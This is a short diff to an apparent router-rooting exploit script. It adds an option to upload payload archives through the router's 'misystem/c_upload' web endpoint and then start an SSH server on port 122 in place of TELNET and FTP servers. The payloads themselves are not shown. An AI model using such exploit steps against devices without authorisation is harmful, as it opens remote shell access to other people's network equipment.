@@ -69,13 +69,19 @@ except Exception:
   die("Password is not correct!")
 
 dn_tmp = 'tmp/'
-dn_dir = 'data/payload/'
+if gw.use_ssh:
+  dn_dir = 'data/payload_ssh/'
+else:
+  dn_dir = 'data/payload/'
 
 print("Begin creating a payload for the exploit...")
 fn_payload1 = 'tmp/payload1.tar.gz'
 fn_payload2 = 'tmp/payload2.tar.gz'
 fn_payload3 = 'tmp/payload3.tar.gz'
-fn_pfname = 'busybox'
+if gw.use_ssh:
+  fn_pfname = 'dropbearmulti'
+else:
+  fn_pfname = 'busybox'
 
 fn_pf1 = dn_tmp + fn_pfname + '_01'
 fn_pf2 = dn_tmp + fn_pfname + '_02'
@@ -156,7 +162,10 @@ if (fn_payload2):
 if (fn_payload3):
   requests.post(urlapi + "misystem/c_upload", files={"image":open(fn_payload3, 'rb')})
 
-print("Running TELNET and FTP servers...")
+if gw.use_ssh:
+  print("Running SSH server on port 122...")
+else:
+  print("Running TELNET and FTP servers...")
 
 requests.get(urlapi + "xqnetdetect/netspeed")
 
